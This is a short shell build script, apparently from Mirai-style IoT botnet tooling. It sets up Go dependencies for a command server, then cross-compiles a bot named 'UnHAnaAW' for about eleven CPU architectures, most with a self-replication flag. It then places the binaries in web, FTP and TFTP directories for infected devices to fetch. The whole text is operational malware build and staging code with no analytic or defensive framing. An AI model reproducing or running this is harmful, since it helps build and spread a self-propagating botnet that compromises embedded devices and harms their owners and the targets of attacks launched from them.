...
export GOROOT=/usr/local/go; export GOPATH=$HOME; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go env -w GO111MODULE=off; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
...
echo "COMPILING i586"
compile_bot i586 UnHAnaAW.x86 "-static -DSELFREP"
echo "COMPILING mips"
compile_bot mips UnHAnaAW.mips "-static -DSELFREP"
echo "COMPILING mipsel"
compile_bot mipsel UnHAnaAW.mpsl "-static -DSELFREP"
echo "COMPILING armv4l"
compile_bot armv4l UnHAnaAW.arm "-static -DSELFREP"
echo "COMPILING armv5l"
compile_bot armv5l UnHAnaAW.arm5 ""
echo "COMPILING armv6l"
compile_bot armv6l UnHAnaAW.arm6 "-static -DSELFREP"
echo "COMPILING armv7l"
compile_bot armv7l UnHAnaAW.arm7 "-static -DSELFREP"
echo "COMPILING ppc"
compile_bot powerpc UnHAnaAW.ppc "-static -DSELFREP"
echo "COMPILING sparc"
compile_bot sparc UnHAnaAW.spc "-static -DSELFREP"
echo "COMPILING m68k"
compile_bot m68k UnHAnaAW.m68k "-static -DSELFREP"
echo "COMPILING sh4"
compile_bot sh4 UnHAnaAW.sh4 "-static -DSELFREP"
cp release/UnHAnaAW* /var/www/html/bins
cp release/UnHAnaAW* /var/ftp
mv release/UnHAnaAW* /var/lib/tftpboot
rm -rf release
###################################################################
